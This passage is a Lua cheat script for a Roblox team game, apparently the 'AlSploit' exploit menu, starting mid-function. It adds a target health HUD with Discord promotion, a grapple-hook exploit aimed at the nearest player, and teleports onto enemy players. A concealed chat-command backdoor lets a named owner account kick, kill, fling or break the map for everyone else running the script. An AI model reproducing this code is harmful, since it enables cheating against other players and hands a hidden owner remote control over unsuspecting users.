            local plrdist = (v.Character:FindFirstChildOfClass('Humanoid').RootPart.Position - LocalPlayer.Character:FindFirstChildOfClass('Humanoid').RootPart.Position).magnitude
            if plrdist < distance then
                target = v
                distance = plrdist
            end
        end
    end
    return target
end

local TargetInfoHUD, Health, Meter, HP, TextLabel

local function UpdateTargetInfo()
    local targetPlayer = GetClosestPlayer()
    if targetPlayer then
        if not TargetInfoHUD then
            -- Instances
            TargetInfoHUD = Instance.new("ScreenGui")
            Health = Instance.new("Frame")
            Meter = Instance.new("Frame")
            local Health2 = Instance.new("TextLabel")
            local ImageLabel = Instance.new("ImageLabel")
            HP = Instance.new("TextLabel")
            TextLabel = Instance.new("TextLabel")
            local ImageLabel_2 = Instance.new("ImageLabel")
            local UICorner = Instance.new("UICorner")

            -- Properties
            TargetInfoHUD.Name = "TargetInfoHUD"
            TargetInfoHUD.Parent = game.CoreGui
            TargetInfoHUD.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            Health.Name = "Health"
            Health.Parent = TargetInfoHUD
            Health.BackgroundColor3 = Color3.new(1, 0, 0.984314)
            Health.BorderColor3 = Color3.new(0, 0, 0)
            Health.BorderSizePixel = 0
            Health.Position = UDim2.new(0.394206524, 0, 0.653802395, 0)
            Health.Size = UDim2.new(0, 227, 0, 102)

            Meter.Name = "Meter"
            Meter.Parent = Health
            Meter.BackgroundColor3 = Color3.new(0.235294, 0.741176, 0)
            Meter.BorderSizePixel = 0
            Meter.Position = UDim2.new(0.152766719, 0, 0.68932277, 0)
            Meter.Size = UDim2.new(0, 172, 0, 2)

            Health2.Name = "Health2"
            Health2.Parent = Health
            Health2.BackgroundColor3 = Color3.new(1, 1, 1)
            Health2.BackgroundTransparency = 1
            Health2.Position = UDim2.new(0.373565435, 0, 0.320388347, 0)
            Health2.Size = UDim2.new(0, 49, 0, 17)
            Health2.Font = Enum.Font.Arial
            Health2.Text = "Health:"
            Health2.TextColor3 = Color3.new(1, 1, 1)
            Health2.TextScaled = true
            Health2.TextSize = 14
            Health2.TextWrapped = true
            Health2.TextXAlignment = Enum.TextXAlignment.Left

            ImageLabel.Parent = Health
            ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
            ImageLabel.BorderColor3 = Color3.new(0, 1, 0)
            ImageLabel.Position = UDim2.new(0.0621761642, 0, 0.0873786435, 0)
            ImageLabel.Size = UDim2.new(0, 55, 0, 51)
            ImageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

            HP.Name = "HP"
            HP.Parent = Health
            HP.BackgroundColor3 = Color3.new(1, 1, 1)
            HP.BackgroundTransparency = 1
            HP.Position = UDim2.new(0.604086936, 0, 0.320388347, 0)
            HP.Size = UDim2.new(0, 49, 0, 17)
            HP.Font = Enum.Font.Arial
            HP.Text = "discord.gg/J6XkRGqTY3"
            HP.TextColor3 = Color3.new(1, 1, 1)
            HP.TextScaled = true
            HP.TextSize = 14
            HP.TextWrapped = true
            HP.TextXAlignment = Enum.TextXAlignment.Left

            TextLabel.Parent = Health
            TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
            TextLabel.BackgroundTransparency = 1
            TextLabel.Position = UDim2.new(0.373565465, 0, 0.0873786435, 0)
            TextLabel.Size = UDim2.new(0, 120, 0, 17)
            TextLabel.Font = Enum.Font.Arial
            TextLabel.Text = "progamers123131"
            TextLabel.TextColor3 = Color3.new(1, 1, 1)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14
            TextLabel.TextWrapped = true
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left

            ImageLabel_2.Parent = Health
            ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
            ImageLabel_2.BackgroundTransparency = 1
            ImageLabel_2.Position = UDim2.new(0.010362694, 0, 0.631067991, 0)
            ImageLabel_2.Size = UDim2.new(0, 19, 0, 16)
            ImageLabel_2.Image = "rbxassetid://7072717560"

            UICorner.Parent = Health
        end
        
        local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
        
        if targetHumanoid then
            local healthColor = Color3.fromRGB(235, 235, 0):Lerp(Color3.fromRGB(85, 255, 0), targetHumanoid.Health / targetHumanoid.MaxHealth)
            local healthChange = targetHumanoid.Health / targetHumanoid.MaxHealth
            
            TargetInfoHUD.Enabled = true
            Meter:TweenSize(UDim2.new(healthChange,0,0.1,0),"In","Linear",1)
            Meter.BackgroundColor3 = healthColor
            HP.Text = math.floor(targetHumanoid.Health)
            TextLabel.Text = "Name: " .. targetPlayer.Name
        end
    elseif TargetInfoHUD then
        TargetInfoHUD.Enabled = false
    end
end

local GrappleHook = true
local tppp = false
GrappleHookTp = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "GrappleHookExploit",
	["Function"] = function(callback)
		if callback then
			CreateNotification("GrappleHookTPPlayer", 1.2, "GrappleHookTPPlayer has been enabled")
			task.spawn(function()
				repeat task.wait()
					local target = getNearestPlayer(9e9)
					if target then
						local bows = getgrapple()
						for i,v in pairs(bows) do
							spoofHand(v.Name)
							task.wait(.06)
							if v.Name == "grappling_hook" then
								if not GrappleHook then continue end
							end
							shoot(v,target.Character.PrimaryPart.Position)
						end
					end
				until (not GrappleHookTp.Enabled)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23
				CreateNotification("GrappleHookTPPlayer", 1.2, "GrappleHookTPPlayer has been disabled")
			end)
		else

		end
	end,
})

local function teleportToRandomPlayer()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
    wait(0.2)

    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local lplr = Players.LocalPlayer

    local function checkHealth()
        repeat
            wait()
        until lplr.Character and lplr.Character:FindFirstChild("Humanoid") and lplr.Character.Humanoid.Health == 100

        -- 停止偵測後執行以下代碼
        local availablePlayers = {}

        for _, player in pairs(Players:GetPlayers()) do
            if player.TeamColor ~= lplr.TeamColor then
                table.insert(availablePlayers, player)
            end
        end

        if #availablePlayers > 0 then
            local selectedPlayer = availablePlayers[math.random(1, #availablePlayers)]
            local part = selectedPlayer.Character.HumanoidRootPart
            local duration = 0.4 -- tp speed

            local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(lplr.Character.HumanoidRootPart, tweenInfo, {CFrame = part.CFrame * CFrame.new(0, 5, 0)})
            tween:Play()
            tween.Completed:Wait()
        else
            print("There are no available players with different team color.")
        end
    end

    checkHealth()
end


local function moveToDifferentTeamPlayer()
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")

    local lplr = Players.LocalPlayer

    game:GetService("VirtualInputManager"):SendKeyEvent(true, "C", false, game)
    wait(6.3)

    local availablePlayers = {}

    for _, player in pairs(Players:GetPlayers()) do
        if player.TeamColor ~= lplr.TeamColor then
            table.insert(availablePlayers, player)
        end
    end

    if #availablePlayers > 0 then
        local selectedPlayer = availablePlayers[math.random(1, #availablePlayers)]
        local part = selectedPlayer.Character.HumanoidRootPart
        local duration = 0.4

        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)

        local moveTween = TweenService:Create(lplr.Character.HumanoidRootPart, tweenInfo, {CFrame = part.CFrame * CFrame.new(0, 5, 0)})
        moveTween:Play()
        moveTween.Completed:Wait()
    else
        print("There are no available players with different team color.")
    end
end

local tppp = false

RecallTp = GuiLibrary.API.Windows.World.CreateButton({
    ["Name"] = "RecallPlayerTp",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("RecallPlayerTp", 1.2, "RecallPlayerTp has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    moveToDifferentTeamPlayer()
                until (not tppp)
                CreateNotification("RecallPlayerTp", 1.2, "RecallPlayerTp has been disabled")
            end)
        else
           
        end
    end,
})

DeathPlayerTp = GuiLibrary.API.Windows.World.CreateButton({
    ["Name"] = "DeathPlayerTp",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("DeathPlayerTp", 1.2, "DeathPlayerTp has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    teleportToRandomPlayer()
                until (not tppp)
                CreateNotification("DeathPlayerTp", 1.2, "DeathPlayerTp has been disabled")
            end)
        else
            
        end
    end,
})


targethud = GuiLibrary.API.Windows.Gui.CreateButton({
	["Name"] = "TargetHud",
	["Function"] = function(callback)
		if callback then
			CreateNotification("TargetHud", 1.2, "TargetHud has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
                UpdateTargetInfo()
				until (not targethud.Enabled)
				CreateNotification("TargetHud", 1.2, "TargetHud has been disabled")
			end)
		end
	end,
})

local Owner = "coco_ontopok522"

task.spawn(function()
	repeat
		task.wait(1)

		task.spawn(function()
			for i, v in next, PlayerService:GetPlayers() do
				v.Chatted:Connect(function(Message)		
					task.spawn(function ()
						if Message:lower() == ";kick" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							game:GetService("Players").LocalPlayer:Kick("Kicked by AlSploit owner")
						end
					end)

					task.spawn(function()
						if Message:lower() == ";kill" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							game.Players.LocalPlayer.Character.Humanoid.Health = 0
						end	
					end)

					task.spawn(function()
						if Message:lower() == ";lagback" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
						end
					end)

					task.spawn(function()
						if Message:lower() == ";breakmap" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							for i, v in next, CollectionService:GetTagged("block") do
								v:Destroy()
							end
						end
					end)					
				end)
			end
		end)		
	until not game
end)


local TweenService = game:GetService("TweenService")
local NeonWaterMark = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

NeonWaterMark.Name = "NeonWaterMark"
NeonWaterMark.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
NeonWaterMark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
NeonWaterMark.ResetOnSpawn = false

TextLabel.Parent = NeonWaterMark
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0, 0)
TextLabel.Size = UDim2.new(0.2, 0, 0.15, 0)
TextLabel.Font = Enum.Font.RobotoMono
TextLabel.Text = "Coco Kiwi Solara discord.gg/FqrVKaHnaw"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 28.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Add UITextSizeConstraint for dynamic text sizing
UITextSizeConstraint.MaxTextSize = 28
UITextSizeConstraint.MinTextSize = 14
UITextSizeConstraint.Parent = TextLabel

-- Tweening function for rainbow color change
local function changeColor()
    local rainbowColor = Color3.fromHSV(tick() % 5 / 5, 1, 1)
    local info = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = TweenService:Create(TextLabel, info, {TextColor3 = rainbowColor})
    tween:Play()
end

-- Run the color change function in a loop
while true do
    changeColor()
    wait(1) -- Adjust the wait time for a smoother or faster color change
end
